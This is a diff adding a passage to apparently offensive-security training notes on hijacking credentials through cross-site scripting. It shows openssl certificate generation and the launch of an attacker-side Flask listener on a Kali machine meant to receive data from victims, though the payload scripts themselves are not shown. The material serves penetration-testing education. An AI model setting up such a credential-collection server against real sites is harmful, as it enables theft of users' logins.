@@ -304,3 +304,25 @@ We can also overwrite the HTML in body by setting `innerHTML` equal to a string 
 ```
 Using this method, we can control every aspect of the user experience. Later, we will expand on these concepts and use XHR requests to retrieve content in a way the victim won't notice.
 ### XSS Hijack Credentials
+Normally, we would use a properly-issued certificate and purchase a domain to host the API server, but for the purposes of this module, a self-signed certificate will suffice. A key and certificate can be generated using the `openssl` command.
+```bash
+kali@kali:~/scripts$ openssl req -x509 -newkey rsa:4096 -nodes -out cert.pem -keyout key.pem -days 365
+Generating a RSA private key
+...................................................................................................++++
+.............................++++
+writing new private key to 'key.pem'
+-----
+```
+Running the API with `sudo python3 api.py` should start the listener on port `80`.
+```bash
+┌──(venv)─(kali㉿kali)-[~]
+└─$ python3 api.py --host 192.168.45.203 --port 80 --cert cert.pem --key key.pem 
+Serving HTTPS on 192.168.45.203 port 80 (http://192.168.45.203:80/) ...
+ * Serving Flask app 'api'
+ * Debug mode: off
+WARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.
+ * Running on https://192.168.45.203:80
+Press CTRL+C to quit
+
+```
+Note: place api.py, db.py and client.js in the same directory 
